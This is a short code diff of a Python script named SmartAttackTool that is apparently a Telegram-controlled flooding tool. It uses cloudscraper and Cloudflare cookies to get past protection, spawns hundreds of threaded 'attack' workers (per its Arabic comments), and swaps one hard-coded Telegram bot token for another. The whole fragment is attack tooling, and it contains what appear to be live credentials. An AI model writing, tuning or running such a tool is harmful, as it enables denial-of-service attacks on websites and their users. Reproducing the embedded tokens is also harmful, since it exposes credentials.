@@ -7,7 +7,7 @@ from fake_useragent import UserAgent
 from bs4 import BeautifulSoup
 import cloudscraper
 
-bot = telebot.TeleBot("7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU")
+bot = telebot.TeleBot("7458138039:AAFSX74H91fXoRgwfqzOzp_qu9QO6vVXFmU")
 
 class SmartAttackTool:
     def __init__(self):
@@ -73,8 +73,8 @@ class SmartAttackTool:
                 self._smart_request(url, cf_cookies)
                 time.sleep(random.uniform(0.5, 2))
 
-        # بدء 50 خيط هجومي
-        for _ in range(1000):
+        # بدء 500 خيط هجومي
+        for _ in range(500):
             t = threading.Thread(target=attacker)
             t.daemon = True
             t.start()
